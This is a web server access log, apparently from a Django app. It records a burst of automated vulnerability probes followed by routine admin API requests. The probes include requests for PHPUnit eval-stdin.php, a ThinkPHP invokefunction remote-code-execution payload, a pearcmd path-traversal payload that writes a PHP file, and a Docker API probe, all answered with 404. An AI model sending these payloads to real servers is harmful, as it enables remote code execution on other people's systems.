[2025-12-22 08:36:57,035] INFO GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 4.34ms
[2025-12-22 08:36:57,208] INFO GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 3.18ms
[2025-12-22 08:36:57,362] INFO GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 2.77ms
[2025-12-22 08:36:57,521] INFO GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 3.08ms
[2025-12-22 08:36:57,684] INFO GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 2.35ms
[2025-12-22 08:36:57,885] INFO GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 404 3.07ms
[2025-12-22 08:36:58,094] INFO GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 404 3.27ms
[2025-12-22 08:36:58,293] INFO GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/%3C?echo(md5(%22hi%22));?%3E+/tmp/index1.php 404 2.9ms
[2025-12-22 08:36:58,512] INFO GET /index.php?lang=../../../../../../../../tmp/index1 404 2.37ms
[2025-12-22 08:36:58,702] INFO GET /containers/json 404 2.32ms
[2025-12-22 08:45:08,006] INFO GET / 404 2.36ms
[2025-12-22 09:03:42,629] INFO GET /admin/api/substudent/ 200 15.86ms
[2025-12-22 09:03:42,848] INFO GET /admin/jsi18n/ 200 3.01ms
[2025-12-22 09:10:28,647] INFO GET /admin/api/substudent/ 200 17.37ms
[2025-12-22 09:10:28,747] INFO GET /admin/jsi18n/ 200 3.12ms
[2025-12-22 09:10:30,499] INFO GET /admin/api/substudent/ 200 18.22ms
[2025-12-22 09:10:30,560] INFO GET /admin/jsi18n/ 200 2.85ms
[2025-12-22 09:15:26,214] INFO GET /admin/api/substudent/ 200 18.58ms
[2025-12-22 09:15:26,289] INFO GET /admin/jsi18n/ 200 2.77ms
[2025-12-22 09:15:33,229] INFO GET /admin/api/substudent/ 200 18.37ms
[2025-12-22 09:15:33,288] INFO GET /admin/jsi18n/ 200 2.64ms
[2025-12-22 09:15:48,294] INFO GET /admin/api/substudent/ 200 17.74ms
[2025-12-22 09:15:48,362] INFO GET /admin/jsi18n/ 200 2.94ms
[2025-12-22 09:20:33,114] INFO GET /admin/api/substudent/ 200 18.24ms
[2025-12-22 09:20:33,235] INFO GET /admin/jsi18n/ 200 2.95ms
[2025-12-22 09:25:24,371] INFO GET /admin/api/substudent/ 200 19.83ms
[2025-12-22 09:25:24,464] INFO GET /admin/jsi18n/ 200 3.05ms
